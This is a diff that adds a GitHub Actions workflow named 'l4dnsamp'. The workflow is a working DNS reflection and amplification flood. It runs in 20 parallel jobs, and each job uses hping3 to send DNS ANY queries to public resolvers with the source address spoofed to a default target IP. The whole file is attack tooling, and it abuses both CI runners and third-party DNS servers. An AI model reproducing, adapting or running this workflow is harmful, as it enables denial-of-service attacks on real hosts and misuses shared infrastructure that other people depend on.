@@ -1,0 +1,26 @@
+name: l4dnsamp
+on:
+  workflow_dispatch:
+    inputs:
+      target: { default: '57.131.163.31' }
+      seconds: { default: '120' }
+      resolvers: { default: '8.8.8.8 1.1.1.1 9.9.9.9 208.67.222.222 64.6.64.6' }
+jobs:
+  amp:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    strategy:
+      fail-fast: false
+      matrix:
+        i: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - name: install hping3
+        run: sudo apt-get update -qq >/dev/null 2>&1; sudo apt-get install -y -qq hping3 >/dev/null 2>&1; which hping3
+      - name: craft dns ANY query (isc.org)
+        run: node -e "require('fs').writeFileSync('/tmp/q.bin', Buffer.from('12340100000100000000000003697363036f72670000ff0001','hex'))" && wc -c /tmp/q.bin
+      - name: dns reflection flood
+        run: |
+          R=( ${{ inputs.resolvers }} ); N=${#R[@]}; RES=${R[$(( ${{ matrix.i }} % N ))]}
+          echo "runner=${{ matrix.i }} resolver=$RES"
+          sleep $(( ${{ matrix.i }} * 2 ))
+          sudo timeout ${{ inputs.seconds }} hping3 -2 --flood -a ${{ inputs.target }} -s 53 -E /tmp/q.bin -p 53 $RES 2>&1 | tail -4
